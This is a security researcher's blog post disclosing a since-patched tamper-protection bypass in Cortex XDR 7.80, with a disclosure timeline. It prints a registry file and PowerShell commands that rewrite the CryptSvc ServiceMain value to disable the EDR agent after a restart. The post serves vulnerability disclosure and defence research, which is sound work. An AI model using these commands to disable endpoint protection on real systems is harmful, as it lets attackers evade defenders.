---
layout: post
title: "Bypassing Cortex XDR"
subtitle: "Tamper-protection bypass (patched) - responsible disclosure"
date: 2022-12-22
categories: [security-research, edr]
tags: [EDR, Windows, registry]

thumbnail-img: https://miro.medium.com/v2/resize:fit:1374/format:webp/0*PbLOP8kLASxiBntJ.jpg
share-img: https://miro.medium.com/v2/resize:fit:1374/format:webp/0*PbLOP8kLASxiBntJ.jpg
author: Ben Tamam
comments: false
readtime: true
share-title: "Bypassing Cortex XDR (Patched) - Ben Tamam"
share-description: "Research note: registry-based tamper bypass in Cortex XDR 7.80, responsibly disclosed and patched (PAN-SA-2022-0005)."
---

## Introduction

As a Red Teamer, I've spent considerable time analyzing EDR solutions. Today, I'm sharing my research on bypassing Cortex XDR's tamper protection - a vulnerability that has since been patched. This analysis was conducted under Palo Alto Networks' responsible disclosure policy and relates to patch **PAN-SA-2022-0005**.

> **Note:** This vulnerability has been patched. This article is published for educational purposes and to demonstrate the importance of continuous security improvements in EDR solutions.

---

## Agent’s Version

The version tested was **7.80**, with all protections enabled, including tamper protection. Testing was done in both normal and aggressive modes.

![Cortex-Version](https://miro.medium.com/v2/resize:fit:1374/format:webp/0*PbLOP8kLASxiBntJ.jpg){: width="900" }

---

## Disabling the Agent

As mentioned in PAN-SA-2022–0002, we attempted to modify the **ServiceDLL** that points Cortex XDR to the `cryptsvc` DLL (a dependency). The idea was that altering it could disable the XDR.

However, this attempt failed as expected.

![ServiceDLL Attempt](https://miro.medium.com/v2/resize:fit:1400/format:webp/0*ClfiwhwPsa4TuuI8.png){: width="900" }

---

## What is Tamper Protection?

Tamper protection is a security feature that prevents unauthorized changes to a system, such as disabling services, modifying files, or altering sensitive configurations. In EDRs, it safeguards the sensor from disruption or modification.

---

## Let’s Get Down to Business

Cortex XDR relies on **Windows Cryptographic Services** for core functionality.

![Cryptographic Services](https://miro.medium.com/v2/resize:fit:750/format:webp/0*fIcRPqDTSZ0-5zav.png){: width="900" }

We analyzed `cryptsvc.dll` using **DLL Export Viewer**, revealing the exported function **CryptServiceMain**. This matches the registry key under:

~~~text
HKLM\SYSTEM\CurrentControlSet\Services\CryptSvc\Parameters\ServiceMain
~~~

![DLL Export Viewer](https://miro.medium.com/v2/resize:fit:786/format:webp/0*umDdKkvre1Il_5IC.png){: width="900" }

---

### Registry File Method

~~~reg
Windows Registry Editor Version 5.00
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CryptSvc\Parameters]
"ServiceDllUnloadOnStop"=dword:1
"ServiceMain"="CryptServiceMain_Disable_Cortex"
~~~

---

### PowerShell Method

~~~powershell
$registryPath = "HKLM:\SYSTEM\CurrentControlSet\Services\CryptSvc\Parameters"
New-ItemProperty -Path $registryPath -Name "ServiceDllUnloadOnStop" -PropertyType DWord -Value 1
New-ItemProperty -Path $registryPath -Name "ServiceMain" -PropertyType String -Value "CryptServiceMain_Disable_Cortex"
~~~

---

Upon execution:

![Regedit](https://miro.medium.com/v2/resize:fit:640/format:webp/0*Aq6u5OQftShhiCIf.png){: width="900" }

The registry values were altered **without Cortex XDR preventing it**.

![Registry Changed](https://miro.medium.com/v2/resize:fit:786/format:webp/0*dR3uFArY3DJHvZp1.png){: width="900" }

After a restart, Cortex XDR should be fully disabled.

![Disabled XDR](https://miro.medium.com/v2/resize:fit:750/format:webp/0*U4Yf2l-ffKkev9_W.png){: width="900" }

---

## Responsible Disclosure Timeline

- **September 30, 2022** - Initial report sent to Palo Alto Networks.
- **December 14, 2022** - Patch released.
- **December 14, 2022** - Advisory published: [PAN-SA-2022-0005](https://security.paloaltonetworks.com/PAN-SA-2022-0005)
